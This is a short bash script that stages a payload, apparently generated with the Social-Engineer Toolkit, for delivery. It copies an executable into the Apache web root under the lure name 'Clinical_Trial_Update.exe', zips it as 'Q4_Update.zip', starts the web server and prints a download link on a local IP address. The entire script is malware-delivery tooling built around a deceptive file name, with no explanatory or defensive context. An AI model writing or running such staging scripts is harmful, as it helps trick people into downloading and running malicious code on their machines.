#!/bin/bash

# Copy the payload to the web server directory
cp /root/.set/payload.exe /var/www/html/Clinical_Trial_Update.exe

# Create the zip archive
cd /var/www/html || exit
zip Q4_Update.zip Clinical_Trial_Update.exe

# Start Apache service
service apache2 start

# Print the download link
echo "[+] Payload hosted at: http://192.168.1.10/Q4_Update.zip"
